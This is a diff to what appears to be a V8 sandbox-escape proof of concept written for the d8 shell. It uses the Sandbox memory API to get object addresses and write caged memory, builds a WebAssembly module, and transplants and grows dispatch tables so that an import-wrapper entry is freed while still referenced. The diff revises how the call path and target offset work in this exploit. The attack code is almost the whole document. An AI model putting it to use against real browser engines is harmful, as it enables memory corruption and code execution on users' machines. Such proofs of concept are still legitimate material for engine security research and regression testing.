@@ -9,7 +9,6 @@ d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');
 const kHeapObjectTag = 1;
 const kWeakHeapObjectTag = 3;
 
-const kWasmTableObjectMaximumLengthOffset = 0x14;
 const kWasmTableObjectTrustedDispatchTableOffset = 0x1c;
 
 let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
@@ -18,9 +17,6 @@ let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
 function addrof(obj, tagged = false) {
   let ofs = Sandbox.getAddressOf(obj);
   return tagged ? (ofs | kHeapObjectTag) : (ofs & ~kWeakHeapObjectTag);
-}
-function fakeobj(ofs) {
-  return Sandbox.getObjectAt(ofs);
 }
 for (let bits = 8; bits <= 64; bits *= 2) {
   const read_fn = memory[`get${bits == 64 ? 'Big' : ''}Uint${bits}`].bind(memory);
@@ -47,13 +43,16 @@ let builder = new WasmModuleBuilder();
 let $s = builder.addStruct([makeField(kWasmI64, true)]);
 let $sig_ls_ll = builder.addType(makeSig([kWasmI64, kWasmI64], [kWasmI64, wasmRefNullType($s)]));
 let $fn = builder.addImport('import', 'fn', $sig_ls_ll);
+builder.addDeclarativeElementSegment([$fn]);
 let $call_fn = builder.addFunction('call_fn', $sig_ls_ll).addBody([
   kExprLocalGet, 0,
   kExprLocalGet, 1,
-  kExprCallFunction, $fn,   // indirect call through dispatch_table_for_imports()
+  kExprRefFunc, $fn,
+  kExprCallRef, $sig_ls_ll,
 ]).exportFunc();
 let instance = builder.instantiate({import: {fn: ()=>[42n, null]}});
 let {call_fn} = instance.exports;
+call_fn(0n, 0n);  // instantiate ref.func
 
 // marker 1 & 2
 let dummy_table1 = new WebAssembly.Table({initial: 1, maximum: 1, element: 'anyfunc'});
@@ -89,7 +88,7 @@ let tt = new WebAssembly.Table({initial: 0, maximum: 0x10, element: 'anyfunc'});
 // grow the transplanted table. this also clears out index 0 in the new WasmDispatchTable(Data)
 // this drops std::shared_ptr<WasmImportWrapperHandle> refcnt to 0, freeing the entry in WasmCPT
 // the original WasmDispatchTable is still very well alive
-let target_ofs = 0x5;
+let target_ofs = 0x7;
 console.log(`[*] using target_ofs = 0x${target_ofs.toString(16)}`);
 let h_target = h1 - h_stride * target_ofs;
 caged_write(addrof(tt) + kWasmTableObjectTrustedDispatchTableOffset, h_target);
